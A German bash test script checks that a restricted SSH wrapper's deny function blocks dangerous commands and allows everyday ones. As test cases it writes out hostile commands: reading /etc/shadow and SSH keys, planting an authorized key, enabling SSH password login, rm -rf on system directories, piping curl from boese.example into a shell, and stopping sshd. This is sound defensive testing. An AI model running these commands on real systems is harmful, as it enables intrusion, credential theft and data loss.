#!/bin/bash
# Testet nur die verboten()-Funktion von bupull_wrapper_mitarbeit.sh (per "source", ohne echte
# Befehle auszufuehren) gegen erlaubte Alltags-Befehle und die Verbotsliste.
set -u
source <(sed -n '/^verboten() {/,/^}/p' /root/neuserver/bupull_wrapper_mitarbeit.sh)
pass=0; fail=0
lauf() { # Beschreibung erwartet(0=erlaubt,1=verboten) Befehl
  local besch="$1" erw="$2" cmd="$3" rc
  verboten "$cmd"; rc=$?
  if [ "$rc" = "$erw" ]; then pass=$((pass+1)); printf "OK   %-55s (verboten=%s)\n" "$besch" "$rc"
  else fail=$((fail+1)); printf "FAIL %-55s erwartet=%s bekam=%s  [%s]\n" "$besch" "$erw" "$rc" "$cmd"; fi
}

echo "=== muss ERLAUBT sein (verboten()=1, also rc=1 bedeutet NICHT verboten -> hier 1 erwarten) ==="
# Achtung: verboten() gibt 0 zurueck, wenn verboten; 1, wenn nicht. "erwartet" ist also 1 fuer normale Befehle.
lauf "git log"                          1 'cd /root/neuserver && git log --oneline -3'
lauf "sed -i auf ziele"                 1 'cd /root/neuserver && sed -i "s/a/b/" ziele'
lauf "crontab -l"                       1 'crontab -l'
lauf "crontab installieren"             1 'crontab -'
lauf "cat auf neuserver-Datei"          1 'cat /root/neuserver/platzwaechter.sh'
lauf "bash -s (Heredoc-Installation)"   1 'bash -s'
lauf "normales rm im DATA-Baum"         1 'rm -rf /DATA/altertest/unterordner'
lauf "normales rm in /tmp"              1 'rm -rf /tmp/irgendwas'
lauf "curl ohne Pipe in Shell"          1 'curl -s https://example.com/datei.txt -o /tmp/datei.txt'

echo
echo "=== muss VERBOTEN sein (verboten()=0) ==="
lauf "authorized_keys lesen"            0 'cat /root/.ssh/authorized_keys'
lauf "authorized_keys aendern"          0 'echo "ssh-ed25519 boese" >> /root/.ssh/authorized_keys'
lauf "sshd_config aendern"              0 'sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config'
lauf "/etc/shadow lesen"                0 'cat /etc/shadow'
lauf "/etc/passwd lesen"                0 'cat /etc/passwd'
lauf "/etc/sudoers lesen"               0 'cat /etc/sudoers'
lauf "eigenen Wrapper aendern"          0 'sed -i "s/verboten/erlaubt/" /root/bin/bupull_wrapper_mitarbeit.sh'
lauf "Automatik-Wrapper aendern"        0 'rm /root/bin/bupull_wrapper_streng.sh'
lauf "Push-Wrapper aendern"             0 'echo x >> /root/bin/backup_ssh_wrapper.sh'
lauf "rm -rf /"                         0 'rm -rf /'
lauf "rm -rf /DATA"                     0 'rm -rf /DATA'
lauf "rm -fr /DATA (andere Optionsreihenfolge)" 0 'rm -fr /DATA'
lauf "rm -rf /root"                     0 'rm -rf /root'
lauf "rm -rf /etc"                      0 'rm -rf /etc'
lauf "curl pipe sh"                     0 'curl -s https://boese.example/x.sh | sh'
lauf "curl pipe bash ohne Leerzeichen"  0 'curl -s https://boese.example/x.sh |bash'
lauf "sshd stoppen"                     0 'systemctl stop sshd'
lauf "sshd deaktivieren"                0 'systemctl disable sshd'
lauf "postfix stoppen"                  0 'systemctl stop postfix'

echo
echo "=== Ergebnis: $pass bestanden, $fail fehlgeschlagen ==="
[ "$fail" = 0 ]
